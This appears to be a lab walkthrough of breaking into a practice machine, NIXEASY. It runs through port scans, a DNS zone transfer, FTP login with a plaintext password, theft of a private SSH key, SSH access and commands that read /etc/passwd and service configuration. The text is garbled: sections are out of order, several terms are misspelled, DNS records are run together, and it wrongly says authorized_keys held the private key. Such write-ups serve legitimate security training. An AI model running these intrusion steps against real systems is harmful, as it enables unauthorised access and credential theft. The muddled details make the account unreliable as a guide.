## Summary

It was possible to gain access to the server by exploiting FTP credentials, which led to a SSH system access.

---
## Enumeration

### 1. Port Scanning

```bash
nmap -sV -p- X.X.X.X
```

**Result:**
<pre>
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     ProFTPD 5/ctcp
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu
53/tcp   open  domain  ISC BIND 9.16.1
2121/tcp open  ftp     ProFTPD
i</pre>

**Observations:**
- Two FTP servers on ports 21 and 2121
- SSH on port 22
- DNS server on port 53

### 2. FTP Scanning

```bash
nmap --script ftp-anon -p 21,2121 X.X.X.X
```

Anonymous login was disabled on both ports.

### 3. DNS Scanning

```bash
# Full enumeration
nmap --script dns-* -p 53 X.X.X.X

# ZFR transfer
dig axfr @X.X.X.X inlanefreight.htb
```

**Result of AXFR transfer:**
<pre>
inlanefreight.htb.    604800  IN  SOA    inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
inlanefreight.htb.    604800  IN  NS    ns.inlanefreight.htb.
app.inlanefreight.htb. 604800 IN A    10.129.18.15
internal.inlanefreight.htb. 604800 IN A   10.129.1.6
mail1.inlanefreight.htb. 604800 IN A   10.129.18.201ns.inlanefreight.htb.  604800  IN  A    10.129.34.136
</pre>

The ZFR transfer revealed the domain structure and potential subdomains.### Checking Configuration Files

```bash
# FTP configuration
cat /etc/proftpd/proftpd.conf

# User listing
cat /etc/passwd | grep -v nologin

# Processes
ps aux

# Network connections
netstat -tulpn
```

---

#############################################################################
## Vulnerability Analysis

### 1. Weak FTP Password

The password `q7er1234` for user `ceil` was very weak and easily guessable/brute-forceable.

### 2. Unsecured DOZ Zone Transfer

The DNS server allowed full zone transfer (AXFR), which revealed the network structure.

### 3. SSH Key in FTP Directory

User `ceil` stored their private SSH key in the FTP directory, allowing it to be downloaded and used for login.

### 4. Lack of SSH Authentication

The SSH server did not require additional authentication - the private key was sufficient to gain access.

---

#############################################################################
## Recommendations

### 1. Password Policy
- Implement strong password policies (minimum 12 characters, mix of characters)
- Regularly rotate passwords

### 2. FTP Configuration
- Disable ability to download files containing SSH keys
- Use chroot for FTP users
- Restrict accessible directories

**Machine:** NIXEASY (10.129.152.227)

---
## Initial Access

### Discovery of Credentials

credentials were used for the FTP instance on port **2121** {it had a different configuration than port 21}.

**Credentials:**
- *Username:* ceil
- *Password:* q7er1234

```bash
ftp X.X.X.X 2121
Connected to 10.129.152.227.
220 ProFTPDServer (ftp.int.inlanefreight.htb) [10.129.152.227]
Name (10.129.152.227:root): ceil
331 Password required for ceil
Password: q7er1234
230 User ceil logged in
```

### FTP Directory Exploration

```bash
ftp> ls -la
200 PORT request successful
150 Opening ASCII mode data connection for file list
drwx-------   2 ceil     ceil          4096 Nov 10  2021 .
drwx-r-x-r-x   4 ceil     ceil          4096 Nov 10  2021 ..
-rw-rw-r--   1 ceil     ceil           738 Nov 10  2021 authorized_keys
-rw-------   1 ceil     ceil          3381 Nov 10  2021 id_rsa
-rw-r--r--   1 ceil     ceil           738 Nov 10  2021 id_rsa.pub
226 Transfer complete
```

**Found Files:**
- `authorized_keys` - SSH authorized keys
- `id_rsa` - private SSH key
- `id_rsa.pub` - public SSH key

### Downloading the SSH Key

```bash
ftp> get id_rsa
ftp> get authorized_keys```

The `authorized_keys` file contained the private SSH key for user `ceil`.

---
## SSH Access

### Logging through SSH

```bash
chmod 600 id_rsa
ssh  ceil@X.X.X.X
```

**Result:**
Welcome to Ubuntu 20.04.1 LTS (Linux 5.4.0-90-generic x86_64)
Last login: Wed Nov 10 05:48:02 2021 from 10.10.14.20
ceil@NIXEASY:~$/pre>

Successfully logged into the system as user `ceil`.

### Enumeration of the System

```bash
# Check user
whoami
# ceil

# Check groups
id
# uid=1001(ceil) gid=1001(ceil) groups=1001(ceil)
```
### System Overview

The home directory was empty:

```bash
ceil@X.X.X.X:~$ ls -la
total 8
drwx------ 2 ceil ceil 4096 Nov 10  2021 .
drwx-r-x-r-x 4 ceil ceil 4096 Nov 10  2021 ..
```
Then:
```bash
cat /home/flag/flag.txt
```
